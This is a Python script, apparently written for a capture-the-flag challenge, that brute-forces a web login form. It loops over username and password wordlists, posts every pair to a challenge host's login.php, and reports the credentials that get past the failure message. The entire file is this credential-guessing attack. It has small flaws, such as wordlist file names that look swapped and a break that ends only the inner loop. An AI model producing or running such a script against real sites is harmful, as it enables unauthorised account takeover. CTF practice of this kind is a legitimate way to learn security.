import requests
from urllib.request import urljoin

URL = "https://ch391378115701.ch.eng.run/"

user = open("pass.txt", "r").read().split()
passwd = open("users.txt", "r").read().split()

class Exploit:
	def __init__(self, user, passwd, url=URL):
		self.user = user
		self.passwd = passwd
		self.url = url
		self.session = requests.Session()

	def Login(self):
		data = {"user": self.user, "pass": self.passwd}
		login = self.session.post(self.url + "/login.php", data=data)

		return login

if __name__ == "__main__":
	for u in user:
		for p in passwd:
			API = Exploit(u, p)
			login = API.Login().text
			print(f"[+] Try login with username {u} and password {p}")
			print(login)
			if login != "Incorrect username or password!!":
				print(f"[+] Got username = {u} and password = {p}")
				print(login,"\n")
				break
